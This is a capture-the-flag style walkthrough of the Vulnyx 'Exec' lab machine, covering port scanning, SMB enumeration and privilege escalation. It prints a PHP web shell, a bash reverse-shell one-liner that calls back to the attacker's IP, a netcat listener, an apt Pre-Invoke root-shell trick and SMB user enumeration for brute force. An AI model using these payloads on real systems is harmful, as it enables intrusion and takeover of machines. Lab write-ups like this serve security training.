---
layout: single
title: Exec - Vulnyx
date: 2024-04-05
classes: wide
header:
  teaser: /assets/images/vulnyx-writeup-exec/exec_logo.png
  teaser_home_page: true
  icon: /assets/images/vulnyx.png
categories:
  - Vulnyx
  - Easy
tags:  
  - User Enumeration SMB
  - brute-force SMB
  - Abusing SUID Binaries
---

![Nmap-logo](/assets/images/vulnyx-writeup-exec/exec_logo.png)

## Port scanning

```bash
sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.1.109 
[sudo] password for kali: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 22:53 CEST
Initiating ARP Ping Scan at 22:53
Scanning 192.168.1.109 [1 port]
Completed ARP Ping Scan at 22:53, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:53
Scanning 192.168.1.109 [65535 ports]
Discovered open port 22/tcp on 192.168.1.109
Discovered open port 80/tcp on 192.168.1.109
Discovered open port 139/tcp on 192.168.1.109
Discovered open port 445/tcp on 192.168.1.109
Completed SYN Stealth Scan at 22:53, 0.85s elapsed (65535 total ports)
Nmap scan report for 192.168.1.109
Host is up, received arp-response (0.000039s latency).
Scanned at 2024-05-04 22:53:37 CEST for 1s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

## Service discovery

```bash
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzUvGOaZF4gJoYBGR4NrMZOj32x98uVDUQ0dY0RENRdIyokD8RvJG8g9g71aoh/20m4mcEEdSyp+eE9ABu1kwk=
|   256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrNZ9AQg+cgX4w0wabsDTAVeo9/VWThsF5efc2OzsFo
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.57 (Debian)
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
MAC Address: 00:0C:29:95:29:7B (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-05-04T22:55:22
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45975/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19509/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38466/udp): CLEAN (Failed to receive data)
|   Check 4 (port 31517/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 1h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: EXEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   EXEC<00>             Flags: <unique><active>
|   EXEC<03>             Flags: <unique><active>
|   EXEC<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
```

## Method 1

We are targeting port 445 (**SMB**) for exploitation. First, we do a smb enumeration with **smbmap**:
![smbmap](/assets/images/vulnyx-writeup-exec/smbmap.png)

The scan shows very interesting information because we have read and write permissions in Server Disk.

Let`s try to login using an unauthenticated **smbclient** connection:

``` bash
smbclient //192.168.1.109/server -p 445
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```

As we have write permissions on this directory, we can create a php file to get a reverse shell:

``` php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

![doorphp](/assets/images/vulnyx-writeup-exec/doorphp.png)

After that, we can go to that location with our firefox browser and try to have remote code execution privileges

![rce](/assets/images/vulnyx-writeup-exec/rce.png)

Bingo!, now we have to create a python http.server that hosts our custom index.html with our reverse shell payload:

``` bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.1.110/4444 0>&1
```

We can communicate with this server using the command **curl + Our IP**. We have to URL-encode it because we are sending it through our web browser

![url-encode](/assets/images/vulnyx-writeup-exec/url-encode.png)

Finally, we start listening on port 4444 with **netcat**:

```bash
nc -lvnp 4444  
```

Now, if we send the url-encoded command, our reverse shell will pop-up

![reverse-shell](/assets/images/vulnyx-writeup-exec/reverse-shell.png)

If we list the user's privileges, we can take advantage of user pivoting:

```bash
www-data@exec:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash
```

``` bash
www-data@exec:/var/www/html$ sudo -u s3cur4 /bin/bash
sudo -u s3cur4 /bin/bash
id
uid=1000(s3cur4) gid=1000(s3cur4) groups=1000(s3cur4)
```

Once we are in s3cur4 user, we can list his privileges and exploit suid binaries:

```bash
sudo -l
Matching Defaults entries for s3cur4 on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```

Using this payload will get us a root shell:

```bash
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

![root](/assets/images/vulnyx-writeup-exec/root.png)

## Method 2

We can also enumerate this service (**SMB**) with **netexec**:

![netexec](/assets/images/vulnyx-writeup-exec/netexecEnumeration.png)

With `lookupnames root` and `rpcclient` we can search for the number related to root:

```bash
┌──(kali㉿kali)-[~]
└─$ rpcclient -U "" -N 192.168.1.109
rpcclient $> lookupnames root
root S-1-22-1-0 (User: 1)
rpcclient $>
```

By knowing the root's SID, we can enumerate system users with `lookupsids`. Searching with this information returns the user **s3cur4**:

```bash
rpcclient $> lookupsids S-1-22-1-1000
S-1-22-1-1000 Unix User\s3cur4 (1)
rpcclient $> 
```

SID 1000 often relates to the system user account.

We can brute-force this user using **netexec**:

![brute-force](/assets/images/vulnyx-writeup-exec/BruteForce.png)
